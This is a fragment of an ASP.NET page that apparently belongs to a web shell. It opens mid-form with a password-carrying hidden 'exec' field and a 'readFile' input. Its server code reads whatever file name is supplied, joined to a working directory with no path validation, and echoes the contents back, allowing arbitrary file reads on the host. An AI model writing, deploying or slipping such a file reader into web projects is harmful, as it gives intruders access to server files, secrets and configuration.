        <input type="hidden" name="exec" value="<%= Server.HtmlEncode(userPassword) %>">
        <input type="text" name="readFile" placeholder="Enter file name..." size="50">
        <input type="submit" value="Read">
    </form>

    <%
        if (!string.IsNullOrEmpty(Request.QueryString["readFile"]))
        {
            string fileToRead = Request.QueryString["readFile"];
            string filePath = Path.Combine(workingDir, fileToRead);

            if (File.Exists(filePath))
            {
                try
                {
                    string content = File.ReadAllText(filePath);
                    Response.Write("<h3>File Content:</h3>");
                    Response.Write("<textarea rows='10' cols='80' readonly>" + Server.HtmlEncode(content) + "</textarea>");
                }
                catch (UnauthorizedAccessException)
                {
                    Response.Write("<p class='error'>Permission Denied</p>");
                }
                catch (Exception ex)
                {
                    Response.Write("<p class='error'>Error reading file</p>");
                }
            }
            else
            {
                Response.Write("<p class='error'>File not found</p>");
            }
        }
    %>

</body>
</html>
